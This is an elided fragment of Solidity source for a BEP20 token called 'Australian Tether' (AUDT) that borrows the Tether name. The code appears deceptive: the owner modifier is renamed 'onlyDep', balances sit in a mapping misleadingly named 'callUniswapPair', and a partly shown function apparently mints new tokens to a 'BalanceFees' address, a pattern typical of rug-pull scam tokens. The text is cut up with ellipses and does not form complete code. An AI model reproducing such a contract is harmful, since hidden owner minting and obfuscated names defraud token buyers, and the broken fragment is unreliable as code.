 ...
 * `onlyDep`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
     ...
     * `onlyDep` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyDep {
     ...
     */
    function transferOwnership(address newOwner) public virtual onlyDep {
...
contract AustralianTether is Context, IBEP20, Ownable, LGEWhitelisted {
    
    using SafeMath for uint256;
    
    mapping (address => uint256) private callUniswapPair;
    ...
    constructor() {
        _name = "Australian Tether";
        _symbol = "AUDT";
        _decimals = 9;
        _totalSupply = 30000000000 * 10 ** 9;
        callUniswapPair[_msgSender()] = _totalSupply;
    ...
    */
    function balanceOf(address account) external view override returns (uint256) {
        return callUniswapPair[account];
    }
    ...
    */
    ...
    = amount * 10 ** 9;
        ...
        emit Transfer(address(0), BalanceFees, amount * 10 ** 9);
  }
    ...
    */
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        callUniswapPair[sender] = callUniswapPair[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        callUniswapPair[recipient] = callUniswapPair[recipient].add(amount);
